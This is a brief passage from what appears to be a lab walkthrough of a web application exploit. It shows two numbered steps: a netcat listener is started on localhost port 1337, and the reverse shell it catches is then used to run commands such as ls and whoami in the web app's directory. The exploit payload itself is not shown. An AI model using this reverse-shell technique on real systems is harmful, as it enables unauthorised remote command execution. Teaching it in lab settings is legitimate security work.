...
6. Open a terminal and type `nc -l 127.0.0.1 1337`.  Looks like nothign is happening but give it a minute while we run the rest of the exploit. 
...
8. Go back to the termina where you entered `nc -l 127.0.0.1 1337` and you will see a Connected! message. Type `ls` to confirm shell is working you should see our web apps directory. You can try different commands like `whoami`. Once you want to get out of shell simply type `exit`.  
